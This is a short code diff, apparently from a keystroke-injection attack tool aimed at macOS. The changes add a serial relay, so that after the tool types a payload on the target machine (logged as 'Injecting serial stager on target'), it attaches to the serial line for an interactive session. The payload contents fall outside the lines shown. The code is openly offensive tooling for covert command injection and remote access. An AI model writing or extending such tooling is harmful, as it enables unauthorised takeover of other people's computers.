@@ -1,9 +1,17 @@
 import time
 from lib.keyboard import Keyboard
+from lib.relay import Relay
+from lib.logger import Logger
+
+def _on_ready() -> None:
+    Logger.success("Connected!")
+    print("")
 
 def macos(baud: int = 115200, show_diagnostics: bool = False) -> None:
     kb = Keyboard()
+    rl = Relay(on_ready=_on_ready)
 
+    Logger.info("Injecting serial stager on target...")
     session_data = ""
     if show_diagnostics:
         session_data = 'sleep 0.05; printf "[MAC stty] %s\\r\\n" "$(stty -f /dev/fd/3 -a)" >&3; printf "\\r\\n" >&3;'
@@ -34,3 +42,8 @@ def macos(baud: int = 115200, show_diagnostics: bool = False) -> None:
     # Send the payload
     kb.send(payload)
     kb.send("{KEY:ENTER}")
+
+    Logger.info("Attaching to serial...")
+    rl.stdio(baud=baud)
+    Logger.info("Session closed.")
+    print("")
